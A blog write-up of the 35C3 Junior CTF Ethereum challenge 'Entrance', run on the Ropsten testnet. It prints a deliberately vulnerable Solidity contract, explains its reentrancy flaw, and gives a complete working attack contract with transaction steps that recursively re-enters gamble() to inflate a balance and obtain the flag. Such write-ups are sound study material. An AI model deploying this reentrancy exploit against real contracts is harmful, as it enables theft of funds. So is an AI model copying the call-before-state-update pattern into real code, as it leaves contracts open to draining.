---
title: 'Solution to 35C3 Junior CTF Challenge "Entrance"'
date: 2019-01-07T02:30:00+01:00
featured_image: blog/images/reentrance.png
images:
  - blog/images/reentrance.png
toc: true
tags:
  - CTF
  - 35C3
  - CCC
---

**TL;DR:** This post has a lot of details. Skip to the [Summary](#summary) if you know the challenge and are here just for the solution.

<div>Door icon made by <a href="https://www.freepik.com/" title="Freepik">Freepik</a> from <a href="https://www.flaticon.com/" title="Flaticon">www.flaticon.com</a> is licensed by <a href="http://creativecommons.org/licenses/by/3.0/" title="Creative Commons BY 3.0" target="_blank">CC 3.0 BY</a>.</div>

Between Christmas and New Year's I attended the 35th Chaos Communication Congress (CCC), *[35C3](https://events.ccc.de/congress/2018/wiki/index.php/Main_Page)*, in Leipzig, Germany, together with Malmö based [Xil hackerspace](https://twitter.com/xil_hackerspace). It was my third congress (in a row).

Since 2012 there has been a [Capture The Flag](https://ctftime.org/ctf-wtf/) (CTF) competition at congress. The C3 CTF has been a qualifier for the [DEF CON CTF](https://www.defcon.org/html/links/dc-ctf.html) since 2015 (32C3 CTF), which has made the challenges really hard to solve for beginners. For that reason the current C3 CTF organizers [Eat Sleep Pwn Repeat](https://twitter.com/EatSleepPwnRpt) introduced a second *junior* version of the CTF one year ago.

This year (2018) we planned to not take the CTF so seriously and not spend all time playing it since there are a lot of other interesting stuff going on at the congress. Well, that didn't go very well. Several of our CTF players spent the majority of the CTF time (which runs for 48 hours) actually playing and our team *xil.se* ended up at [sixth place](https://archive.aachen.ccc.de/junior.35c3ctf.ccc.ac/scoreboard/index.html) on the 35C3 Junior CTF! We even ranked number two for about 20 hours:

{{< tweet 1078439011780313091 >}}

I spent a whole day solving the challenge *Entrance* in the Ethereum category <nobr>*Of course*</nobr> (which held only one more challenge). This is my story on how we solved it.

# The Challenge
**Name:** Entrance<br/>
**Solves:** 15<br/>
**Points:** 242 (starting at 500 when just one team solves it)<br/>
**Description:**<br/>
Can you enter? Again?<br/>
[Contract](https://ropsten.etherscan.io/address/0x1898Ed72826BEfa2D549004C57F048A95ae0B982) [Source](/blog/resources/91ac4d3b9f94f4f3b7015a30d5ffa9bf-Entrance.sol)<br/>
**Difficulty estimate:** Medium

The link *Contract* in the description goes to *Etherscan - The Ethereum Block Explorer* so it's obvious that this is an Ethereum related challenge and I know from before that Ethereum is a very popular so called *crypto currency* like Bitcoin (well, the actual currency is apparently called *Ether*), but I don't know very much about it. Except that you can define "smart" *contracts* with it. It turned out quite fast that this challenge goes on in a test network called *Ropsten* which is quite funny because I'm from Sweden and Ropsten is one of the terminal stations (*slutstation* in Swedish which is funny for English speakers) in the [Stockholm metro network](https://sl.se/ficktid/karta/vinter/Tub.pdf). [*Rinkeby*](https://www.rinkeby.io/) is another Ethereum test network and also a Stockholm metro station. Anyhow - good that we don't have to spend real Ether on the challenge!

# The Contract
The challenge authors are nice to give us the source of the Ethereum contract. Contracts are compiled to a byte code used in the [Ethereum Virtual Machine](http://ethdocs.org/en/latest/introduction/what-is-ethereum.html#ethereum-virtual-machine) (EVM). Contracts can be written in many languages but this contract uses [Solidity](https://en.wikipedia.org/wiki/Solidity). Let's have a look at the source:

{{< highlight solidity "linenos=table" >}}
pragma solidity >=0.4.21 <0.6.0;

import "./SafeMath.sol";

contract Entrance {
  using SafeMath for *;
  mapping(address => uint256) public balances;
  mapping(address => bool) public has_played;
  uint256 pin;

  event EntranceFlag(string server, string port);

  modifier legit(uint256 _pin) {
    if (_pin == pin) _;
  }

  modifier onlyNewPlayer {
    if (has_played[msg.sender] == false) _;
  }

  constructor(uint256 _pin) public {
    pin = _pin;
  }

  function enter(uint256 _pin) public legit(_pin) {
    balances[msg.sender] = 10;
    has_played[msg.sender] = false;
  }

  function balanceOf(address _who) public view returns (uint256 balance) {
    return balances[_who];
  }

  function gamble() public onlyNewPlayer {
    require (balances[msg.sender] >= 10);
    if ((block.number).mod(7) == 0) {
      balances[msg.sender] = balances[msg.sender].add(10);
      // Tell the sender he won!
      msg.sender.call("You won!");
      has_played[msg.sender] = true;
    } else {
      balances[msg.sender] = balances[msg.sender].sub(10);
    }
  }

  function getFlag(string memory _server, string memory _port) public {
    require (balances[msg.sender] > 300);
    emit EntranceFlag(_server, _port);
  }
}
{{< /highlight >}}

There is a function `getFlag()` which takes `_server` and `_port` as string arguments so the flag will be sent to us in some way, but we need to have enough of some kind of *balance* first. It's unclear to us if and how the Ethereum network will connect to us. After some reading we understand that since `EntranceFlag` is an *event* (defined on line 11), such an event will be published on the Ethereum network together with the contract.

{{< highlight solidity "linenos=table,linenostart=11" >}}
  event EntranceFlag(string server, string port);
{{< /highlight >}}

So we assume that the CTF organizers will monitor their contract's event log and send the flag to `server:port` once there is a new event emitted. Several teams have already solved the challenge and our team member Linus notices [events on the particular contract](https://ropsten.etherscan.io/address/0x1898Ed72826BEfa2D549004C57F048A95ae0B982#events). The Etherscan site shows the latest 25 events for a contract and now when authoring the write-up they are from after the CTF closed, but let's take one such late event as an example. Event emitted in transaction [0xcfede920ce0cdb1aeae7...](https://ropsten.etherscan.io/tx/0xcfede920ce0cdb1aeae7608bdfb9965c14b1adf1ca2fc7f3e1f3ed72244f8b67#eventlog):

```
Address  0x1898ed72826befa2d549004c57f048a95ae0b982
Topics   [0] 0x31f9f688587d79c168d76bc74a671922d95848f11342b5896712138d1fb57554
Data     0000000000000000000000000000000000000000000000000000000000000040
         0000000000000000000000000000000000000000000000000000000000000080
         000000000000000000000000000000000000000000000000000000000000000b
         332e382e3137302e313335000000000000000000000000000000000000000000
         0000000000000000000000000000000000000000000000000000000000000004
         3830303000000000000000000000000000000000000000000000000000000000
```

All data is in hex and we notice that the fourth and sixth value starts non-zero. Converting them to text (easily done using the drop-down on the site) yields:

```
3.8.170.135
8000
```

So now we know how to retrieve the flag once we meet the balance check, but how do we get there?

# Idea: Get Balance Below Zero
In order to `gamble()` you first have to `enter()` which sets your balance to 10. If you're lucky you get 10 additional balance but if you're unlucky you lose 10. I also notice that `balances` is a map of `uint256`. You lose with probability 0.8571 (6/7) so my idea is to quickly `gamble()` multiple times in a row (at least twice) so that both gamblings first pass the balance check on line 35 and then subtract 10 from my balance for every loss. I don't know if I have understood how the Ethereum blockchain works and if this is possible.

{{< highlight solidity "linenos=table,linenostart=34,hl_lines=9" >}}
  function gamble() public onlyNewPlayer {
    require (balances[msg.sender] >= 10);
    if ((block.number).mod(7) == 0) {
      balances[msg.sender] = balances[msg.sender].add(10);
      // Tell the sender he won!
      msg.sender.call("You won!");
      has_played[msg.sender] = true;
    } else {
      balances[msg.sender] = balances[msg.sender].sub(10);
    }
  }
{{< /highlight >}}

If it works this will result in a very huge balance since there are no negative numbers (it's apparently called [integer **overflow**](https://en.wikipedia.org/wiki/Integer_overflow) -- [underflow](https://en.wikipedia.org/wiki/Arithmetic_underflow) is another thing), thus passing the `getFlag()` balance check of at least 300.

# Getting Some Ether And Sending My First Ethereum Transaction
When reading the contract code I apparently read too fast. I thought you choose a PIN yourself, but the constructor setting the PIN was of course run when the CTF organizers created/uploaded the contract. My team member Linus realized this and found the PIN in the [constructor arguments of the contract](https://ropsten.etherscan.io/address/0x1898Ed72826BEfa2D549004C57F048A95ae0B982#code):

```
0000000000000000000000000000000000000000000000000000000000bc4f77
```

Converting from hex gives the PIN *12341111*.

I want to interact with the contract, for example running `enter(12341111)` and then checking that my balance is 10 with `balanceOf()`. I found Bitfalls' excellent tutorial [*How to Call Ethereum Smart Contract Functions*](https://bitfalls.com/2018/04/08/how-to-call-ethereum-smart-contract-functions/) which tells me that:

* transactions can be made using [MyEtherWallet](https://www.myetherwallet.com/)
* the ABI of a contract (Application *Binary* Interface) is needed in order to interact with it
* the ABI can be generated using the web based Solidity IDE [*Remix*](https://remix.ethereum.org/) if you have the contract's source code

I go to the Remix website and add the file [Entrance.sol](/blog/resources/91ac4d3b9f94f4f3b7015a30d5ffa9bf-Entrance.sol) and try to compile it. Of course I get an error on this row since I don't have the file:
{{< highlight solidity "linenos=table,linenostart=3" >}}
import "./SafeMath.sol";
{{< /highlight >}}

Easy to fix though. I search for the name and find that it's a common library which exists on GitHub. I change the line and it compiles!

{{< highlight solidity "linenos=table,linenostart=3" >}}
import "github.com/OpenZeppelin/openzeppelin-solidity/contracts/math/SafeMath.sol";
{{< /highlight >}}

Exporting the ABI of contract [Entrance.sol](/blog/resources/91ac4d3b9f94f4f3b7015a30d5ffa9bf-Entrance.sol) from Remix gives me a file I choose to call [Entrance.abi.json](/blog/resources/Entrance.abi.json). Excerpt:
{{< highlight json "linenos=table" >}}
[
  {
    "constant": false,
    "inputs": [
      {
        "name": "_pin",
        "type": "uint256"
      }
    ],
    "name": "enter",
    "outputs": [],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "function"
  },
{{< /highlight >}}

I create an account at [MyEtherWallet](https://www.myetherwallet.com/). My address is [0x4ed42ff4bab2553fe46e65c725eb5256c2e8d48d](https://ropsten.etherscan.io/address/0x4ed42ff4bab2553fe46e65c725eb5256c2e8d48d) in case you want to follow my first unsteady Ethereum steps. :)

Read operations are free in the Ethereum network but anything that changes state is a *transaction* and you pay with *gas* units which are fractions of an Ether. See MyEtherWallet's article [What is Gas?](https://kb.myetherwallet.com/gas/what-is-gas-ethereum.html) for details and nice looking transaction graphics.

In the test networks there are *faucets*. Some of them give out 1 ETH (Ether) regularly just by asking for it. I used the [Ropsten Ethereum Faucet](https://faucet.ropsten.be) to fuel up my above address with 1 ETH so I can start sending transactions.

My first `enter(12341111)` transaction is [0x8b4f70c012a71f54a339...](https://ropsten.etherscan.io/tx/0x8b4f70c012a71f54a33987a268a0fdfcaa74020eb443ed70c082aff67a0e0a45). It seems to work as intended since running `balanceOf(0x4eD42ff4bAB2553fE46E65C725eb5256C2E8D48D)` afterwards returns *10*.

I'm not sure I tried my idea about running `gamble()` multiple times in a row because I searched for common Ethereum vulnerabilites, saw a suspicious warning in Remix and Linus saw a lot of interesting transactions on the network from other teams which gave us an idea about the proper solution...

# Idea: Design My Own Contract To Trigger Reentrancy
When I compiled the *Entrance* contract in Remix I got a couple of warnings. One of them was:

> Potential Violation of Checks-Effects-Interaction pattern in Entrance.gamble(): Could potentially lead to re-entrancy vulnerability.

[Reentrancy](https://en.wikipedia.org/wiki/Reentrancy_(computing)) is a new thing to me. From Wikipedia:

> In computing, a computer program or subroutine is called **reentrant** if it can be interrupted in the middle of its execution and then safely be called again ("re-entered") before its previous invocations complete execution. The interruption could be caused by an internal action such as a jump or call, or by an external action such as an interrupt or signal. Once the reentered invocation completes, the previous invocations will resume correct execution.

Both the challenge name *Entrance* and the hint *Can you enter? Again?* point in this direction. I found the great article [Reentrancy Attack On Smart Contracts: How To Identify The Exploitable And An Example Of An Attack Contract](https://medium.com/@gus_tavo_guim/reentrancy-attack-on-smart-contracts-how-to-identify-the-exploitable-and-an-example-of-an-attack-4470a2d8dfe4) by Gustavo (Gus) Guimaraes. One could guess that the challenge author based the challenge on exactly that article...

So now my goal shifted to write my own contract to exploit the vulnerability, which lies in that whoever calls `Entrance.gamble()` will get called using the `call()` function after the balance is increased and **before** setting `has_played` to *true*, and is therefore allowed to run `gamble()` again, recursively until it has enough balance to run `getFlag()`.

{{< highlight solidity "linenos=table,linenostart=34,hl_lines=4 6 7" >}}
  function gamble() public onlyNewPlayer {
    require (balances[msg.sender] >= 10);
    if ((block.number).mod(7) == 0) {
      balances[msg.sender] = balances[msg.sender].add(10);
      // Tell the sender he won!
      msg.sender.call("You won!");
      has_played[msg.sender] = true;
    } else {
      balances[msg.sender] = balances[msg.sender].sub(10);
    }
  }
{{< /highlight >}}

I call my exploit contract *ReEntrance*. In the constructor I save the address to the Entrance contract (well I could have hard coded it) and the strings `server` and `port` where we want the flag to be sent:

{{< highlight solidity "linenos=table,linenostart=5,hl_lines=6-10" >}}
contract ReEntrance {
  Entrance public entrance;
  string server;
  string port;

  constructor (address _entrance, string _server, string _port) public {
    server = _server;
    port = _port;
    entrance = Entrance(_entrance);
  }
{{< /highlight >}}

From Gus' article we see that the secret to the exploit is to add a so called [fallback function](https://solidity.readthedocs.io/en/latest/contracts.html#fallback-function) to our exploit contract. It's an unnamed function which will be called when the Entrance contract runs `call()` on the sender, which will be our ReEntrance contract:

{{< highlight solidity "linenos=table,linenostart=39" >}}
      msg.sender.call("You won!");
{{< /highlight >}}

So let's add an unnamed function which calls `gamble()` again to trigger the recursion:

{{< highlight solidity >}}
  function () public payable {
    entrance.gamble();
    if (entrance.balanceOf(this) > 300) {
      entrance.getFlag(server, port);
    }
  }
{{< /highlight >}}

We also need a way to start the chain so I add this function:

{{< highlight solidity >}}
  function enter () public {
    entrance.enter(12341111);
  }
{{< /highlight >}}

Remix is running in my browser (Firefox) and currently I can't interact with any Ethereum network. In order to do so I follow Moses Sam Paul's guide [Deploy Smart Contracts on Ropsten Testnet through Ethereum Remix](https://medium.com/swlh/deploy-smart-contracts-on-ropsten-testnet-through-ethereum-remix-233cd1494b4b) which tells me to install the Firefox add-on [Metamask](https://metamask.io/). It allows me to interact with the network without running a full Ethereum node, and I choose to import my existing account/address from MyEtherWallet where I have ~1 ETH. In Remix I set the run environment to *Injected Web 3* and now I can make transactions in Remix and sign them in the Metamask add-on. Nifty!

An [instance of my first version on ReEntrance](https://ropsten.etherscan.io/address/0x015220622e8baaefc29e0a5805a619ab083c03d3) was created on the network, but I had to correct it since I forgot to `gamble()` after running `enter()` (doh!).

Correction:

{{< highlight solidity "hl_lines=3" >}}
  function enter () public {
    entrance.enter(12341111);
    entrance.gamble();
  }
{{< /highlight >}}

# Running Out of Gas And Problems Changing The Limit

I deploy an [instance of my second version](https://ropsten.etherscan.io/address/0xae83112c86289f76a8bafe976c738eef85c889fc) and make a couple of `enter()` transactions until the block number modulo seven becomes zero. I got "lucky" in TX [0xf46f4f481481d0b7b260...](https://ropsten.etherscan.io/tx/0xf46f4f481481d0b7b260120a5a9190aac8fe3dcec72a2c195d6d2ce6555b1bb8), but I ran out of gas so I thought I need to increase the *gas limit* of the transaction in Remix. The default value is 3 million so I tried to increase it to 30 million but I ran out of gas again in TX [0x4200f6285a598d63b88d...](https://ropsten.etherscan.io/tx/0x4200f6285a598d63b88d6142e58724f24f658fcda8bdb00ecf70b238c7341f96). I've seen other teams' transactions with much lower gas limit so something must be wrong!

It turns out I should have inspected my transactions a bit more. Whatever I set the gas limit to in the *Run* tab in Remix, the transaction will have some kind of estimated gas limit, in my case 47920. Seems like I hit the `remix-ide` [issue #1352: *Gas limit is ignored.*](https://github.com/ethereum/remix-ide/issues/1352)

I thought it was fixed on master. I neither looked at *which* master nor saw that the associated `remix` [pull request #1092 *Use the provided gas limit, not the estimated one*](https://github.com/ethereum/remix/pull/1092) wasn't closed yet, so I went on building Remix from source using `npm` and the official [installation instructions](https://github.com/ethereum/remix-ide/blob/master/README.md#installation) to no avail. Didn't work of course. TX [0x2f1695fc1989adb494d0...](https://ropsten.etherscan.io/tx/0x2f1695fc1989adb494d09bb245cabf71f39e48b20d9366680527f20cfa1925b4) got a gas limit of 720212 even though I set 3000000 in the Remix GUI.

Now I got the idea that since the ReEntrance contract was already instantiated on the network using Remix, could I make an `enter()` transaction using *MyEtherWallet* instead? Maybe there I could set the gas limit properly? I decided to try. I created some transactions with gas limit of one million until I got a block number divisible with seven in TX [0xe5d4083afafa10dca305...](https://ropsten.etherscan.io/tx/0xe5d4083afafa10dca3057c8b7944d09f457cc5e4c0fadcee76511318c276cc28). Out of gas again, and running `balanceOf()` returned just 110.

Now I thought that the operations of checking the balance and see whether it was time to call `getFlag()` costed too much gas to I decided to remove both the check and the call. I figured I can just `gamble()` until the transaction runs out of gas and then call `getFlag()` manually. That must be done with the same sender though, so I added a function to ReEntrance for doing so, see highlighted lines below. Now the [`ReEntrance.sol`](/blog/resources/ReEntrance.sol) source code looks like this:

{{< highlight solidity "linenos=table,hl_lines=21-23" >}}
pragma solidity >=0.4.21 <0.6.0;

import "browser/Entrance.sol";

contract ReEntrance {
  Entrance public entrance;
  string server;
  string port;

  constructor (address _entrance, string _server, string _port) public {
    server = _server;
    port = _port;
    entrance = Entrance(_entrance);
  }
  
  function enter () public {
    entrance.enter(12341111);
    entrance.gamble();
  }
  
  function getFlag () public {
    entrance.getFlag(server, port);
  }

  function kill () public {
    selfdestruct(msg.sender);
  }
  
  function () public payable {
    entrance.gamble();
  }
}
{{< /highlight >}}

Compiling this version gave me [this ABI](/blog/resources/ReEntrance.abi.json). A new instance was created at address [0x67ed0fee42a4131b0af0d44e00a2cb7357b7b943](https://ropsten.etherscan.io/address/0x67ed0fee42a4131b0af0d44e00a2cb7357b7b943).

I created new `enter()` transactions with gas limit one million until I got lucky in TX [0xad3c7fca72744e9a488b...](https://ropsten.etherscan.io/tx/0xad3c7fca72744e9a488b4e84f50ed56666519ce285b15c75d3086c6b88418975). Out of gas as expected, but only 110 in balance again.

I increased the gas limit to five million and got lucky in TX [0x3e2ba4ec658a2d5dd5c9...](https://ropsten.etherscan.io/tx/0x3e2ba4ec658a2d5dd5c9d3e29db19a1b07cdd74f4fe15955bdcd16bae9710392), and now the balance was **1100**!

# Time To Get The Flag!
In the constructor I had supplied server `185.35.202.202` and port `9056` (one of [Hackeriet](https://hackeriet.no/index.en.html)'s IPv4 addresses -- thanks to Alexander Kjäll for running Netcat in a screen for me). Now it was time to `getFlag()`! That was done in TX [0x9cd4fc3d942ef82c1ea1...](https://ropsten.etherscan.io/tx/0x9cd4fc3d942ef82c1ea12c02a928eed06f50c3584c2a21eb00d674a3dda47791). Quite soon I could see an anticipated entry in the event log:

```
Address  0x1898ed72826befa2d549004c57f048a95ae0b982
Topics   [0] 0x31f9f688587d79c168d76bc74a671922d95848f11342b5896712138d1fb57554
Data     0000000000000000000000000000000000000000000000000000000000000040
         0000000000000000000000000000000000000000000000000000000000000080
         000000000000000000000000000000000000000000000000000000000000000e
         3138352e33352e3230322e323032000000000000000000000000000000000000
         0000000000000000000000000000000000000000000000000000000000000004
         3939353600000000000000000000000000000000000000000000000000000000
```

I went for lunch and sent a message to Alexander asking if he got a flag, and 13 minutes later I got:

> Ja :D

{{< tweet 1079063827952685057 >}}

The flag was
```
35c3_reeeeeeeeeeeeeeeeeeeeee
```
and the CTF organizers seemed to send the flag every minute or so.

# Summary

The following Ethereum contract is vulnerable to a [reentrancy attack](https://medium.com/@gus_tavo_guim/reentrancy-attack-on-smart-contracts-how-to-identify-the-exploitable-and-an-example-of-an-attack-4470a2d8dfe4) since the sender is called **before** it's recorded that the sender has played and can't play anymore and efter the balance is increased:

{{< highlight solidity "linenos=table,hl_lines=37 39-40" >}}
pragma solidity >=0.4.21 <0.6.0;

import "./SafeMath.sol";

contract Entrance {
  using SafeMath for *;
  mapping(address => uint256) public balances;
  mapping(address => bool) public has_played;
  uint256 pin;

  event EntranceFlag(string server, string port);

  modifier legit(uint256 _pin) {
    if (_pin == pin) _;
  }

  modifier onlyNewPlayer {
    if (has_played[msg.sender] == false) _;
  }

  constructor(uint256 _pin) public {
    pin = _pin;
  }

  function enter(uint256 _pin) public legit(_pin) {
    balances[msg.sender] = 10;
    has_played[msg.sender] = false;
  }

  function balanceOf(address _who) public view returns (uint256 balance) {
    return balances[_who];
  }

  function gamble() public onlyNewPlayer {
    require (balances[msg.sender] >= 10);
    if ((block.number).mod(7) == 0) {
      balances[msg.sender] = balances[msg.sender].add(10);
      // Tell the sender he won!
      msg.sender.call("You won!");
      has_played[msg.sender] = true;
    } else {
      balances[msg.sender] = balances[msg.sender].sub(10);
    }
  }

  function getFlag(string memory _server, string memory _port) public {
    require (balances[msg.sender] > 300);
    emit EntranceFlag(_server, _port);
  }
}
{{< /highlight >}}

One can exploit the contract by writing another contract with an unnamed fallback function which calls `gamble()` again recuresively until the Ethereum transaction is out of gas. With enough gas the balance will reach at least 300 and `getFlag()` can be called with a server and port where the flag will be delivered.

I wrote the following contract:

{{< highlight solidity "linenos=table" >}}
pragma solidity >=0.4.21 <0.6.0;

import "browser/Entrance.sol";

contract ReEntrance {
  Entrance public entrance;
  string server;
  string port;

  constructor (address _entrance, string _server, string _port) public {
    server = _server;
    port = _port;
    entrance = Entrance(_entrance);
  }
  
  function enter () public {
    entrance.enter(12341111);
    entrance.gamble();
  }
  
  function getFlag () public {
    entrance.getFlag(server, port);
  }

  function kill () public {
    selfdestruct(msg.sender);
  }
  
  function () public payable {
    entrance.gamble();
  }
}
{{< /highlight >}}

I created an instance and called `enter()` until the Ethereum block number was divisible by seven, then checked the balance and called for the flag:
```
ReEntrance(0x1898Ed72826BEfa2D549004C57F048A95ae0B982, "185.35.202.202", "9956")
  -> 0x67ed0fee42a4131b0af0d44e00a2cb7357b7b943
enter()
balanceOf(0x67ed0fee42a4131b0af0d44e00a2cb7357b7b943)
  -> 1100
getFlag()
```

The flag got delivered to the wanted `server:port`:
```
35c3_reeeeeeeeeeeeeeeeeeeeee
```

# More 35C3 Junior CTF Write-Ups
The Norwegian hackerspace [Hackeriet](https://hackeriet.no/index.en.html) had a (tiny) [team](https://archive.aachen.ccc.de/junior.35c3ctf.ccc.ac/submissions/755/index.html) in the 35C3 Junior CTF. Please see the following write-ups by Alexander Kjäll a.k.a. capitol:

* [Solution to 35C3 Junior CTF challenge pretty linear](https://blog.hackeriet.no/solution-to-junior-35c3-pretty-linear/)
* [Solution to 35C3 Junior CTF challenge DANCEd](https://blog.hackeriet.no/solution-to-junior-35c3-DANCEd/)
* [Solution to 35C3 Junior CTF challenge Decrypted](https://blog.hackeriet.no/solution-to-junior-35c3-Decrypted/)
* [Solution to 35C3 Junior CTF challenge flags](https://blog.hackeriet.no/solution-to-junior-35c3-flags/)
